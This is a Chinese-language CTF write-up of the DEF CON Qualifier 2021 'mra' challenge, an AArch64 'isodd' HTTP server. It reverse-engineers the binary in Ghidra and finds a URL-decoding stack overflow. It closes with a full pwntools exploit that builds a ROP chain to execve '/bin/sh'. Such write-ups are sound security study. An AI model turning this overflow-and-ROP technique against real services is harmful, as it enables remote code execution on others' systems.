# Defon Qual 2021 Mra


<!--more-->
## 功能分析

程序是静态链接，并且去掉了符号信息。

```shell
$ file mra
mra: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, stripped
```

题目描述是 `Is it odd?`，用 IDA 打开发现栈帧分析会出错，看函数序发现栈是向上生长的，确实挺 `odd`。IDA 没法使用，看了 Writeup 发现可以用 Ghidra。

```c
undefined8 main(undefined4 param_1,undefined8 param_2)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  ulong uVar6;
  long lVar7;
  undefined8 uStack0000000000000010;
  undefined4 uStack000000000000001c;
  undefined8 in_stack_00000020;
  char cVar8;
  char *pcVar9;
  char *pcVar10;
  char *pcVar11;
  
  uStack0000000000000010 = param_2;
  uStack000000000000001c = param_1;
  FUN_00401018(PTR_DAT_0041cf60,0,2,0);
  FUN_00401018(PTR_FUN_0041cf58,0,2,0);
  pcVar10 = "GET /api/isodd/";
  pcVar9 = "Buy isOddCoin, the hottest new cryptocurrency!";
  cVar8 = '\0';
  FUN_00405ba0(&stack0x00000028,0,0x400);
  pcVar11 = "public";
  uVar2 = FUN_004064f8(0,&stack0x00000028,0x3ff);
  if ((8 < uVar2) && (iVar3 = FUN_00405eb0(&stack0x00000028,pcVar10,0xf), iVar3 == 0)) {
    puVar4 = (undefined *)FUN_00405ca8(&stack0x00000028,10);
    if (puVar4 != (undefined *)0x0) {
      *puVar4 = 0;
      if (puVar4[-1] == '\r') {
        puVar4[-1] = '\0';
      }
    }
    puVar4 = (undefined *)FUN_00406358(&stack0x00000028," HTTP/");
    if (puVar4 != (undefined *)0x0) {
      *puVar4 = 0;
    }
    puVar4 = (undefined *)FUN_00405ca8(&stack0x00000028,0x3f);
    if (puVar4 != (undefined *)0x0) {
      *puVar4 = 0;
      puVar4 = puVar4 + 1;
      iVar3 = FUN_00405eb0(puVar4,"token=",6);
      if (iVar3 == 0) {
        pcVar11 = puVar4 + 6;
      }
    }
    puVar4 = &stack0x00000037;
    puVar5 = (undefined *)FUN_00405ca8(puVar4,0x2f);
    if (puVar5 != (undefined *)0x0) {
      *puVar5 = 0;
    }
    uVar6 = FUN_00405e28(puVar4);
    iVar3 = FUN_00405de0(pcVar11,"enterprise");
    if (iVar3 == 0) {
      if (0xc < uVar6) {
        FUN_004002c4(0x191,"{\n\t\"error\": \"contact us for unlimited large number support\"\n}");
        return 0;
      }
    }
    else {
      iVar3 = FUN_00405de0(pcVar11,"premium");
      if (iVar3 == 0) {
        if (9 < uVar6) {
          FUN_004002c4(0x191,
                       "{\n\t\"error\": \"sign up for enterprise to get large number support\"\n}");
          return 0;
        }
      }
      else {
        pcVar11 = "public";
        if (6 < uVar6) {
          FUN_004002c4(0x191,
                       "{\n\t\"error\": \"sign up for premium or enterprise to get large number support\"\n}"
                      );
          return 0;
        }
      }
    }
    iVar3 = FUN_004001d0(&stack0x00000428,puVar4);
    lVar7 = (long)iVar3;
    if ((cVar8 == '-') && (iVar3 = FUN_00405de0(pcVar11,"public"), iVar3 == 0)) {
      FUN_004002c4(0x191,
                   "{\n\t\"error\": \"sign up for premium or enterprise to get negative number support\"\n}"
                  );
    }
    else {
      uVar2 = (byte)(&stack0x00000427)[lVar7] - 0x30;
      in_stack_00000020 = 0;
      iVar3 = FUN_00405de0(pcVar11,"public");
      if (iVar3 == 0) {
        uVar1 = -(uVar2 & 1);
        if (-1 < (int)uVar2) {
          uVar1 = uVar2 & 1;
        }
        if (uVar1 == 1) {
          pcVar11 = "true";
        }
        else {
          pcVar11 = "false";
        }
        FUN_00400d88(&stack0x00000020,"{\n\t\"isodd\": %s,\n\t\"ad\": \"%s\"\n}\n",pcVar11,pcVar9);
      }
      else {
        uVar1 = -(uVar2 & 1);
        if (-1 < (int)uVar2) {
          uVar1 = uVar2 & 1;
        }
        if (uVar1 == 1) {
          pcVar11 = "true";
        }
        else {
          pcVar11 = "false";
        }
        FUN_00400d88(&stack0x00000020,"{\n\t\"isodd\": %s\n}\n",pcVar11);
      }
      FUN_004002c4(200,in_stack_00000020);
    }
  }
  return 0;
}
```

因为是静态链接并且去掉了符号，看起来非常头疼，不过可以根据正向编程经验确定一些函数，比如在 `main` 开头处有

```c
  FUN_00401018(PTR_DAT_0041cf60,0,2,0);
  FUN_00401018(PTR_FUN_0041cf58,0,2,0);
  pcVar10 = "GET /api/isodd/";
  pcVar9 = "Buy isOddCoin, the hottest new cryptocurrency!";
  cVar8 = '\0';
  FUN_00405ba0(&stack0x00000028,0,0x400);
  pcVar11 = "public";
  uVar2 = FUN_004064f8(0,&stack0x00000028,0x3ff);
```

根据经验不难猜到是 `setvbuf`，`memset` 和 `read` 三个操作。用类似的方法可以得到以下代码：

```c
undefined8 main(undefined4 param_1,undefined8 param_2)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  ulong uVar6;
  long lVar7;
  undefined8 uStack0000000000000010;
  undefined4 uStack000000000000001c;
  undefined8 in_stack_00000020;
  char cVar8;
  char *pcVar9;
  char *pcVar10;
  char *pcVar11;
  
  uStack0000000000000010 = param_2;
  uStack000000000000001c = param_1;
  setvbuf(PTR_DAT_0041cf60,0,2,0);
  setvbuf(PTR_FUN_0041cf58,0,2,0);
  pcVar10 = "GET /api/isodd/";
  pcVar9 = "Buy isOddCoin, the hottest new cryptocurrency!";
  cVar8 = '\0';
  memset(&stack0x00000028,0,0x400);
  pcVar11 = "public";
  uVar2 = read(0,&stack0x00000028,0x3ff);
  if ((8 < uVar2) && (iVar3 = strncmp(&stack0x00000028,pcVar10,0xf), iVar3 == 0)) {
    puVar4 = (undefined *)strchr(&stack0x00000028,L'\n');
    if (puVar4 != (undefined *)0x0) {
      *puVar4 = 0;
      if (puVar4[-1] == '\r') {
        puVar4[-1] = '\0';
      }
    }
    puVar4 = (undefined *)strstr(&stack0x00000028," HTTP/");
    if (puVar4 != (undefined *)0x0) {
      *puVar4 = 0;
    }
    puVar4 = (undefined *)strchr(&stack0x00000028,0x3f);
    if (puVar4 != (undefined *)0x0) {
      *puVar4 = 0;
      puVar4 = puVar4 + 1;
      iVar3 = strncmp(puVar4,"token=",6);
      if (iVar3 == 0) {
        pcVar11 = puVar4 + 6;
      }
    }
    puVar4 = &stack0x00000037;
    puVar5 = (undefined *)strchr(puVar4,0x2f);
    if (puVar5 != (undefined *)0x0) {
      *puVar5 = 0;
    }
    uVar6 = strlen(puVar4);
    iVar3 = strcmp(pcVar11,"enterprise");
    if (iVar3 == 0) {
      if (0xc < uVar6) {
        http_msg(0x191,"{\n\t\"error\": \"contact us for unlimited large number support\"\n}");
        return 0;
      }
    }
    else {
      iVar3 = strcmp(pcVar11,"premium");
      if (iVar3 == 0) {
        if (9 < uVar6) {
          http_msg(0x191,"{\n\t\"error\": \"sign up for enterprise to get large number support\"\n}"
                  );
          return 0;
        }
      }
      else {
        pcVar11 = "public";
        if (6 < uVar6) {
          http_msg(0x191,
                   "{\n\t\"error\": \"sign up for premium or enterprise to get large number support\"\n}"
                  );
          return 0;
        }
      }
    }
    iVar3 = strcpy(&stack0x00000428,puVar4);
    lVar7 = (long)iVar3;
    if ((cVar8 == '-') && (iVar3 = strcmp(pcVar11,"public"), iVar3 == 0)) {
      http_msg(0x191,
               "{\n\t\"error\": \"sign up for premium or enterprise to get negative number support\"\n}"
              );
    }
    else {
      uVar2 = (byte)(&stack0x00000427)[lVar7] - 0x30;
      in_stack_00000020 = 0;
      iVar3 = strcmp(pcVar11,"public");
      if (iVar3 == 0) {
        uVar1 = -(uVar2 & 1);
        if (-1 < (int)uVar2) {
          uVar1 = uVar2 & 1;
        }
        if (uVar1 == 1) {
          pcVar11 = "true";
        }
        else {
          pcVar11 = "false";
        }
        sprintf(&stack0x00000020,"{\n\t\"isodd\": %s,\n\t\"ad\": \"%s\"\n}\n",pcVar11,pcVar9);
      }
      else {
        uVar1 = -(uVar2 & 1);
        if (-1 < (int)uVar2) {
          uVar1 = uVar2 & 1;
        }
        if (uVar1 == 1) {
          pcVar11 = "true";
        }
        else {
          pcVar11 = "false";
        }
        sprintf(&stack0x00000020,"{\n\t\"isodd\": %s\n}\n",pcVar11);
      }
      http_msg(200,in_stack_00000020);
    }
  }
  return 0;
}
```

到这里整个程序的逻辑就非常清晰了。

## 寻找漏洞

用上述方法分析后，我尝试了很久都没能找到漏洞。于是又参考了 Writeup，发现漏洞在 `FUN_004001d0` 函数中。这里我根据程序逻辑直接把它当作库函数 `strcpy` 因此没有深入分析。其实正确的做法是根据程序逻辑和函数自身的代码确定它的功能。

```c
int vuln_cpy(long param_1,long param_2)

{
  uint uVar1;
  long lStack0000000000000020;
  long lStack0000000000000028;
  byte bStack0000000000000037;
  int iStack0000000000000038;
  int iStack000000000000003c;
  
  iStack000000000000003c = 0;
  iStack0000000000000038 = 0;
  lStack0000000000000020 = param_2;
  lStack0000000000000028 = param_1;
  while (bStack0000000000000037 = *(byte *)(lStack0000000000000020 + iStack000000000000003c),
        bStack0000000000000037 != 0) {
    if (bStack0000000000000037 == '%') {
      uVar1 = FUN_00400144(*(undefined *)(lStack0000000000000020 + (long)iStack000000000000003c + 1)
                          );
      bStack0000000000000037 =
           FUN_00400144(*(undefined *)(lStack0000000000000020 + (long)iStack000000000000003c + 2));
      bStack0000000000000037 = (byte)((uVar1 & 0xff) << 4) | bStack0000000000000037;
      iStack000000000000003c = iStack000000000000003c + 3;
    }
    else {
      iStack000000000000003c = iStack000000000000003c + 1;
    }
    *(byte *)(lStack0000000000000028 + iStack0000000000000038) = bStack0000000000000037;
    iStack0000000000000038 = iStack0000000000000038 + 1;
  }
  return iStack0000000000000038;
}
```

`vuln_cpy` 用于将字符串从源地址拷贝到目的地址，遇到 `%` 后会把接下来两个字符作为 16 进制读取，并进行一个 url decode 的操作。不难发现这个函数不会被 `%\x00` 这样的模式截断，这样就会绕过 `main` 中的长度检查造成栈溢出漏洞。

## 漏洞利用

```shell
$ checksec ./mra
[*] '/mnt/c/Users/ay3/Desktop/Archive/ooo/mra/mra'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

找到可用的 gadget：

```shell
$ aarch64-linux-gnu-objdump -d mra | grep -B10 -A5 svc
  ...
  4007b4:       f85f83e8        ldur    x8, [sp, #-8]
  4007b8:       f85f03e0        ldur    x0, [sp, #-16]
  4007bc:       f85e83e1        ldur    x1, [sp, #-24]
  4007c0:       f85e03e2        ldur    x2, [sp, #-32]
  4007c4:       d4000001        svc     #0x0
  4007c8:       d10083ff        sub     sp, sp, #0x20
  4007cc:       d65f03c0        ret
  ...
```

构造 rop 链如下：

```python
rop = p64(0) + p64(0) + p64(binary.bss()) + p64(constants.SYS_execve)
rop += p64(8) + p64(binary.bss()) + p64(0) + p64(constants.SYS_read) + b'a' * 8 + p64(gadget)
```

完整  exp 如下：

```python
from pwn import *
import urllib

context.log_level = 'debug'
context.arch = 'aarch64'

binary = ELF('./mra')

# cmd = 'qemu-aarch64 -g 1234 mra'
cmd = 'qemu-aarch64 mra'
p = process(cmd.split())
# pause()

#   4007b4:       f85f83e8        ldur    x8, [sp, #-8]
#   4007b8:       f85f03e0        ldur    x0, [sp, #-16]
#   4007bc:       f85e83e1        ldur    x1, [sp, #-24]
#   4007c0:       f85e03e2        ldur    x2, [sp, #-32]
#   4007c4:       d4000001        svc     #0x0
#   4007c8:       d10083ff        sub     sp, sp, #0x20
#   4007cc:       d65f03c0        ret
gadget = 0x4007b4

# p.sendline(b'GET /api/isodd/%\x00' + cyclic(0x500) + b'HTTP/1.1')

# offset = cyclic_find(p64(0x61616562616164), n=8)

rop = p64(0) + p64(0) + p64(binary.bss()) + p64(constants.SYS_execve)
rop += p64(8) + p64(binary.bss()) + p64(0) + p64(constants.SYS_read) + b'a' * 8 + p64(gadget)
rop = urllib.parse.quote(rop).encode()

payload = b'GET /api/isodd/%\x00'
payload += b'a' * 0x28 + rop

p.send(payload.ljust(0x3ff, b'a'))
sleep(0.1)
p.sendline(b'/bin/sh\x00')

p.interactive()
```
